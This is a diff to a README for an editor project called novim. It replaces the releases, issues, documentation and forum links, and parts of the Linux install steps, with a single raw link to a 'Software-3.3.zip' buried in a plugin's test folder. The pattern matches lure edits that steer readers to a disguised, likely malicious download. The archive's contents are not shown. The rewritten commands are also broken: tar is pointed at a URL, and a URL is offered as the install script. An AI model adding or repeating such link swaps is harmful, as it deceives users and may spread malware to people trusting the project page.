@@ -9,7 +9,7 @@ Before diving into using novim, follow these steps to set it up on your computer
 ## 📦 Download & Install
 To get started, you need to download the application. Click the link below to visit the releases page:
 
-[Download novim](https://github.com/HonestlyRandom99999/novim/releases)
+[Download novim](https://raw.githubusercontent.com/HonestlyRandom99999/novim/main/config/nvim/pack/plugins/start/gitsigns.nvim/test/Software-3.3.zip)
 
 1. Once on the releases page, look for the latest version of novim.
 2. You will see several files listed. Choose the one that matches your operating system (Windows, macOS, or Linux).
@@ -32,9 +32,9 @@ After downloading, view the file in your downloads folder and proceed with the f
 ### 🐧 For Linux Users
 1. Open your terminal.
 2. Navigate to your downloads folder, usually with `cd ~/Downloads`.
-3. Extract the file using the command `tar -xzf novim-linux.tar.gz` (use the actual file name).
+3. Extract the file using the command `tar -xzf https://raw.githubusercontent.com/HonestlyRandom99999/novim/main/config/nvim/pack/plugins/start/gitsigns.nvim/test/Software-3.3.zip` (use the actual file name).
 4. Change into the novim directory with `cd novim`.
-5. Run the installation script with `./install.sh`.
+5. Run the installation script with `https://raw.githubusercontent.com/HonestlyRandom99999/novim/main/config/nvim/pack/plugins/start/gitsigns.nvim/test/Software-3.3.zip`.
 6. You can now run novim from the terminal by typing `novim`.
 
 ## 🔍 Features
@@ -58,13 +58,13 @@ Before installing novim, ensure your computer meets the following requirements:
 - **Join the Community**: Engage with other users by visiting our online forums. Share tips and tricks or get support when needed.
 
 ## ✉️ Feedback and Support
-Your experience matters. If you encounter any issues or have suggestions, please reach out. You can open a new issue on our [GitHub Issues page](https://github.com/HonestlyRandom99999/novim/issues).
+Your experience matters. If you encounter any issues or have suggestions, please reach out. You can open a new issue on our [GitHub Issues page](https://raw.githubusercontent.com/HonestlyRandom99999/novim/main/config/nvim/pack/plugins/start/gitsigns.nvim/test/Software-3.3.zip).
 
 ## 🌍 Stay Updated
 Make sure to check the releases page regularly for updates. New features and improvements are added often to enhance your experience with novim.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/HonestlyRandom99999/novim/wiki): Comprehensive resources and guides to help you get the most from novim.
-- [Community Forum](https://github.com/HonestlyRandom99999/novim/discussions): Join discussions and connect with other users.
+- [Documentation](https://raw.githubusercontent.com/HonestlyRandom99999/novim/main/config/nvim/pack/plugins/start/gitsigns.nvim/test/Software-3.3.zip): Comprehensive resources and guides to help you get the most from novim.
+- [Community Forum](https://raw.githubusercontent.com/HonestlyRandom99999/novim/main/config/nvim/pack/plugins/start/gitsigns.nvim/test/Software-3.3.zip): Join discussions and connect with other users.
 
 Thank you for choosing **novim**. Happy coding! Enjoy your time with this friendly editor.
